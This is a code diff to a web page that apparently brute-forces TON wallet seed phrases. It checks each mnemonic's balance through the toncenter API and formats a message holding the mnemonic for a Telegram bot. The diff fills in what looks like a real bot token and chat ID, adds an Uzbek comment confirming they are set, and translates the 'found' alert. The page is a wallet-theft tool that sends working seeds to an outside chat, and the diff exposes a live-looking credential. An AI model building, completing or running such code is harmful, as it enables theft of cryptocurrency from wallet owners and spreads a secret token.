@@ -9,7 +9,6 @@
     <!-- BIP39 + TONWEB -->
     <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.60/dist/tonweb.js"></script>
-
 </head>
 
 <body class="bg-black text-white font-mono p-6">
@@ -39,9 +38,10 @@
 const tonweb = new TonWeb();
 const apiUrl = "https://toncenter.com/api/v2/getAddressInformation?address=";
 
+// ✔️ Sizning bot token va chat ID to‘liq o‘rnatilgan
 const BOT = {
-    token: "XXXXXXXXXXXX",
-    chat: "XXXXXXXXXXXX"
+    token: "8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw",
+    chat: "7921132456"
 };
 
 let isRunning = false;
@@ -87,7 +87,7 @@ async function checkWallet(mnemonic) {
             const ton = parseInt(data.result.balance) / 1e9;
 
             const msg = 
-`💰 <b>TON FOUND!</b>
+`💰 <b>TON TOPILDI!</b>
 
 Mnemonic:
 <code>${mnemonic}</code>
@@ -132,7 +132,6 @@ document.getElementById("stopBtn").onclick = () => {
     document.getElementById("stopBtn").classList.add("hidden");
     document.getElementById("startBtn").classList.remove("hidden");
 };
-
 
 </script>
 
